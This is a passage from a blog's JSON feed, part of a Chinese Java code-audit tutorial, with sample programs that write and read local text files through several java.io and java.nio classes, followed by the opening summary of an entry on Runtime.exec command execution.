      "content_html": "\n<h2>1、Java文件系统</h2>\n<p>在Java语言中对文件的任何操作最终都是通过<code>JNI</code>调用<code>C语言</code>函数实现的。Java SE中内置了两类文件系统：<code>java.io</code>和<code>java.nio</code>，<code>java.nio</code>的实现是<code>sun.nio</code>。</p>\n<p>Java为了能够实现跨操作系统对文件进行操作抽象了一个叫做文件系统的对象:<code>java.io.FileSystem</code>，不同的操作系统有不一样的文件系统,例如<code>Windows</code>和<code>Unix</code>就是两种不一样的文件系统： <code>java.io.UnixFileSystem</code>、<code>java.io.WinNTFileSystem</code>，不同的操作系统只需要实现起抽象出来的文件操作方法即可实现跨平台的文件操作</p>\n<p><code>FileSystem</code>类的对象表示Java程序中的文件系统。<code>FileSystem</code>对象用于执行两个任务：</p>\n<ul>\n<li>Java程序和文件系统之间的接口。</li>\n<li>一个工厂，它用于创建许多类型的文件系统相关对象和服务。</li>\n</ul>\n<h2>2、Java读写文件的方式举例</h2>\n<h3>2.1 FileWriter和FileReader</h3>\n<blockquote>\n<p>对文件内容按字符读取</p>\n</blockquote>\n<p>这种方式可以修改27行<code>new char[]</code>的长度，读取特定长度的字符。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">File</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileReader</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">FileWriter</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/5 12:46\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FileWriterTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> dir <span class=\"token operator\">=</span> <span class=\"token string\">\"D:\\\\a.txt\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//如果文件不存在，创建文件</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            file<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//创建FileWriter对象</span>\n        <span class=\"token class-name\">FileWriter</span> fileWriter <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileWriter</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//向文件中写入内容</span>\n        fileWriter<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the first way to write and read\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fileWriter<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fileWriter<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token comment\">//创建FileReader对象，读取文件中的内容</span>\n        <span class=\"token class-name\">FileReader</span> fileReader <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileReader</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//  char[] ch = new char[100]; 此处可以修改长度为想要读取的长度</span>\n        <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> ch <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">char</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">int</span><span class=\"token punctuation\">)</span> file<span class=\"token punctuation\">.</span><span class=\"token function\">length</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        fileReader<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>ch<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">char</span> c<span class=\"token operator\">:</span>ch<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">print</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fileReader<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>2.2 BuffredReader和BufferedWriter</h3>\n<blockquote>\n<p>对文件内容进行整行读取</p>\n</blockquote>\n<p>通过修改下面25行<code>int readLine</code>，即可修改想要读取的行数。</p>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/5 13:30\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">BuffredReaderTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> dir <span class=\"token operator\">=</span> <span class=\"token string\">\"D:\\\\b.txt\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//如果文件不存在，创建文件</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            file<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//创建BufferedWriter对象并向文件写入内容</span>\n        <span class=\"token class-name\">BufferedWriter</span> bw <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedWriter</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileWriter</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//向文件中写入内容</span>\n        bw<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"line1: the second way to write and read\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bw<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"line2: the second way to write and read\\n\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bw<span class=\"token punctuation\">.</span><span class=\"token function\">flush</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        bw<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token comment\">//创建BufferedReader读取文件内容</span>\n        <span class=\"token class-name\">BufferedReader</span> br <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">BufferedReader</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">FileReader</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">int</span> readLine <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">String</span> line<span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>line<span class=\"token operator\">=</span>br<span class=\"token punctuation\">.</span><span class=\"token function\">readLine</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token operator\">!=</span><span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            i<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">&lt;=</span> readLine<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">{</span>\n                <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>line<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">}</span>\n        <span class=\"token punctuation\">}</span>\n        br<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>2.3 FileInputStream和FileOutputStream</h3>\n<blockquote>\n<p>以字节的形式写入文件，读取文件时先读取字节数组，再将字节数组转换为字符串形式</p>\n</blockquote>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/5 13:52\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FileInputStreamTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">String</span> dir <span class=\"token operator\">=</span> <span class=\"token string\">\"D:\\\\c.txt\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span>dir<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//如果文件不存在，创建文件</span>\n        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token operator\">!</span>file<span class=\"token punctuation\">.</span><span class=\"token function\">exists</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n            file<span class=\"token punctuation\">.</span><span class=\"token function\">createNewFile</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//创建FileOutputStream对象，写入内容</span>\n        <span class=\"token class-name\">FileOutputStream</span> fos <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileOutputStream</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">//向文件中写入内容</span>\n        fos<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"the third way to write and read\"</span><span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fos<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">//创建FileInputStream对象，读取文件内容</span>\n        <span class=\"token class-name\">FileInputStream</span> fis <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">FileInputStream</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义每次输入流读取到的字节数对象</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义缓冲区大小</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 创建二进制输出流对象</span>\n        <span class=\"token class-name\">ByteArrayOutputStream</span> out <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 循环读取文件内容</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">=</span> fis<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的</span>\n            <span class=\"token comment\">// 下标0开始截取，a表示输入流read到的字节数。</span>\n            out<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        fis<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h3>2.4 RandomAccessFile</h3>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token operator\">*</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/5 14:11\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">RandomAccessFileTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">RandomAccessFileTest</span> randomAccessFileTest <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RandomAccessFileTest</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\"><span class=\"token namespace\">randomAccessFileTest<span class=\"token punctuation\">.</span></span>FileWrite</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\"><span class=\"token namespace\">randomAccessFileTest<span class=\"token punctuation\">.</span></span>FileRead</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">FileWrite</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">File</span> file <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D:\\\\d.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义待写入文件内容</span>\n        <span class=\"token class-name\">String</span> content <span class=\"token operator\">=</span> <span class=\"token string\">\"the fourth way to write and read\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 创建RandomAccessFile对象,rw表示以读写模式打开文件，一共有:r(只读)、rw(读写)、</span>\n        <span class=\"token comment\">// rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。</span>\n        <span class=\"token class-name\">RandomAccessFile</span> raf <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RandomAccessFile</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token string\">\"rw\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 写入内容二进制到文件</span>\n        raf<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        raf<span class=\"token punctuation\">.</span><span class=\"token function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">void</span> <span class=\"token class-name\">FileRead</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">File</span> file  <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D://d.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">RandomAccessFile</span> raf <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">RandomAccessFile</span><span class=\"token punctuation\">(</span>file<span class=\"token punctuation\">,</span> <span class=\"token string\">\"r\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义每次输入流读取到的字节数对象</span>\n        <span class=\"token keyword\">int</span> a <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义缓冲区大小</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token number\">1024</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 创建二进制输出流对象</span>\n        <span class=\"token class-name\">ByteArrayOutputStream</span> out <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">ByteArrayOutputStream</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 循环读取文件内容</span>\n        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a <span class=\"token operator\">=</span> raf<span class=\"token punctuation\">.</span><span class=\"token function\">read</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">!=</span> <span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token comment\">// 截取缓冲区数组中的内容，(bytes, 0, a)其中的0表示从bytes数组的</span>\n            <span class=\"token comment\">// 下标0开始截取，a表示输入流read到的字节数。</span>\n            out<span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">,</span> <span class=\"token number\">0</span><span class=\"token punctuation\">,</span> a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">toString</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div><h3>2.5 FileSystemProvider</h3>\n<blockquote>\n<p><code>java.nio.file.Files</code>是通过调用<code>FileSystemProvider</code>实现的文件操作</p>\n</blockquote>\n<div class=\"language-java\" data-ext=\"java\" data-title=\"java\"><pre class=\"language-java\"><code><span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">IOException</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Files</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Path</span></span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token import\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>nio<span class=\"token punctuation\">.</span>file<span class=\"token punctuation\">.</span></span><span class=\"token class-name\">Paths</span></span><span class=\"token punctuation\">;</span>\n\n<span class=\"token doc-comment comment\">/**\n * <span class=\"token keyword\">@author</span> : echo0d\n * <span class=\"token keyword\">@date</span> : 2023/10/5 14:29\n * @Description :\n */</span>\n<span class=\"token keyword\">public</span> <span class=\"token keyword\">class</span> <span class=\"token class-name\">FileSystemProviderTest</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">static</span> <span class=\"token keyword\">void</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> args<span class=\"token punctuation\">)</span> <span class=\"token keyword\">throws</span> <span class=\"token class-name\">IOException</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token class-name\">Path</span> path <span class=\"token operator\">=</span> <span class=\"token class-name\">Paths</span><span class=\"token punctuation\">.</span><span class=\"token function\">get</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"D:\\\\e.txt\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 定义待写入文件内容</span>\n        <span class=\"token class-name\">String</span> content <span class=\"token operator\">=</span> <span class=\"token string\">\"the fifth way to write and read\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 写入内容二进制到文件</span>\n        <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">write</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">getBytes</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// 开始读文件</span>\n        <span class=\"token keyword\">byte</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> bytes <span class=\"token operator\">=</span> <span class=\"token class-name\">Files</span><span class=\"token punctuation\">.</span><span class=\"token function\">readAllBytes</span><span class=\"token punctuation\">(</span>path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token class-name\">System</span><span class=\"token punctuation\">.</span>out<span class=\"token punctuation\">.</span><span class=\"token function\">println</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">String</span><span class=\"token punctuation\">(</span>bytes<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span>\n<span class=\"token punctuation\">}</span>\n\n</code></pre></div>",
      "date_published": "2023-12-24T03:35:37.000Z",
      "date_modified": "2024-08-13T09:55:52.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "2-命令执行",
      "url": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/2-commandExecute.html",
      "id": "https://echo0d.github.io/DailyNotes/CodeAudittutorial/1-JavaBase/2-commandExecute.html",
      "summary": "2-命令执行\nJava调用外部可执行程序或系统命令，主要有以下两种调用方式\n1、Runtime\n1.1 简介\nRuntime.getRuntime().exec用于调用外部可执行程序或系统命令，并重定向外部程序的标准输入、标准输出和标准错误到缓冲池。功能和windows“运行”类似。\n\nRuntime是一个单例的实例\nRuntime运行应用程序与运行应...",
